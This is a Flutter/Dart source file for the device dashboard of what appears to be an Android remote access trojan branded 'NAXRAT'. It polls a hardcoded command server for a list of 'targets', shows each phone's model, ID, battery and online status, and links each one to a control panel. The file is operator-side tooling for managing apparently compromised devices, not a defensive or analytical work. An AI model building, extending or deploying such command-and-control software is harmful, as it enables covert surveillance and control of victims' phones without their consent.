import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

// ==================== GANTI DOMAIN DI SINI ====================
const String SERVER_URL = "http://rizqynst.sano.biz.id:2000";

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  
  // Warna NAXRAT
  final Color primaryRed = const Color(0xFFE53935);
  final Color darkRed = const Color(0xFFB71C1C);
  final Color darkBg = const Color(0xFF0A0C10);
  final Color cardBg = const Color(0xFF1A1D2D);
  final Color textWhite = const Color(0xFFFFFFFF);
  final Color textGray = const Color(0xFF9E9E9E);

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("$SERVER_URL/api/list-targets"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.where((d) => d['status'] == "Online").length;

    return Scaffold(
      backgroundColor: darkBg,
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // --- TOP HEADER ---
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: cardBg,
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(bottom: BorderSide(color: primaryRed.withOpacity(0.3))),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("ACTIVE TARGETS", style: TextStyle(color: Color(0xFFE53935), fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("$activeCount", style: const TextStyle(color: Color(0xFFE53935), fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar, color: primaryRed.withOpacity(0.8), size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          const Text("TOTAL DEVICES", style: TextStyle(color: Colors.white54, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("${_devices.length}", style: const TextStyle(color: Color(0xFFE53935), fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 15),
                
                // --- SUBHEADER ---
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text(
                        "CONNECTED DEVICES", 
                        style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5)
                      ),
                      GestureDetector(
                        onTap: () => Navigator.pop(context), 
                        child: const Icon(Icons.close, color: Color(0xFFE53935), size: 18),
                      )
                    ],
                  ),
                ),
                
                const SizedBox(height: 10),

                // --- GRID DATA ---
                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Color(0xFFE53935)))
                    : _devices.isEmpty 
                      ? const Center(
                          child: Text("NO TARGETS FOUND", 
                          style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold, letterSpacing: 2)))
                      : GridView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3,
                            crossAxisSpacing: 8,
                            mainAxisSpacing: 8,
                            childAspectRatio: 0.75,
                          ),
                          itemCount: _devices.length,
                          itemBuilder: (context, index) {
                            final device = _devices[index];
                            bool isActive = device['status'] == "Online";
                            Color statusColor = isActive ? primaryRed : Colors.redAccent;

                            return GestureDetector(
                              onTap: () {
                                Navigator.pushNamed(
                                  context, 
                                  '/control_panel', 
                                  arguments: device 
                                );
                              },
                              child: Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: cardBg,
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: isActive ? primaryRed.withOpacity(0.5) : Colors.white12,
                                    width: 1,
                                  ),
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        const Icon(Icons.phone_android, color: Colors.white54, size: 14),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                                          decoration: BoxDecoration(
                                            border: Border.all(color: statusColor.withOpacity(0.5)),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Row(
                                            children: [
                                              CircleAvatar(radius: 2.5, backgroundColor: statusColor),
                                              const SizedBox(width: 3),
                                              Text(
                                                isActive ? "ON" : "OFF", 
                                                style: TextStyle(color: statusColor, fontSize: 6, fontWeight: FontWeight.bold)
                                              ),
                                            ],
                                          ),
                                        ),
                                      ],
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Text(
                                      device['model'] ?? "Unknown",
                                      style: const TextStyle(color: Color(0xFFE53935), fontSize: 10, fontWeight: FontWeight.bold),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 2),
                                    Text(
                                      device['id'] ?? "NO-ID",
                                      style: const TextStyle(color: Colors.white24, fontSize: 7),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Row(
                                      children: [
                                        const Icon(Icons.battery_charging_full, color: Colors.white54, size: 10),
                                        const SizedBox(width: 2),
                                        Text(
                                          "${device['battery'] ?? '0'}%", 
                                          style: const TextStyle(color: Colors.white70, fontSize: 8, fontWeight: FontWeight.bold)
                                        ),
                                      ],
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      "Last: ${device['lastSeen']?.toString().substring(0, 10) ?? 'Unknown'}", 
                                      style: const TextStyle(color: Colors.white24, fontSize: 6),
                                      maxLines: 1,
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}